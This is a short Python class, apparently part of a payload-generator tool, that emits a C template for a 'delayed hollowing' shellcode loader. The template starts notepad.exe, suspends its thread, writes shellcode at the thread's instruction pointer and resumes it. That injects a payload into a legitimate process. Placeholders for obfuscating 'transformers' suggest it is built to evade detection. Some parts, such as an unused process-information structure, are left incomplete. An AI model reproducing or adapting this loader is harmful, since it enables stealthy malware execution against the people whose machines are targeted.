class delayedhollow:

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                "#include <winternl.h>"]

    def compilerOptions(self) -> list[str]:
        return []

    def template(self) -> str:
        return """
{imports}

{codeblocks}

NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, /*enum _PROCESSINFOCLASS*/DWORD, PVOID, ULONG, PULONG) = NULL;

int main()
{{
    
    {transformers}
    
    STARTUPINFOA si = {{
        sizeof(si)
    }}; 
    PROCESS_INFORMATION pi; 

    PPEB pPeb;
    PVOID pImage, pEntry;
    PIMAGE_NT_HEADERS pNtHeaders;
    LONG e_lfanew;
    SIZE_T NumberOfBytesRead;
    DWORD AddressOfEntryPoint;

    CreateProcessA(NULL, (LPSTR) "C:\\\\windows\\\\system32\\\\notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    Sleep(5000);

    NTSTATUS status;
    PROCESS_BASIC_INFORMATION pbi;

    memset(&pbi, 0, sizeof(pbi));

    SuspendThread(pi.hThread);
    pPeb = pbi.PebBaseAddress;

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    WriteProcessMemory(pi.hProcess, (LPVOID)ctx.Rip, shellcode, {shellcodeSize}, NULL);

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}}
"""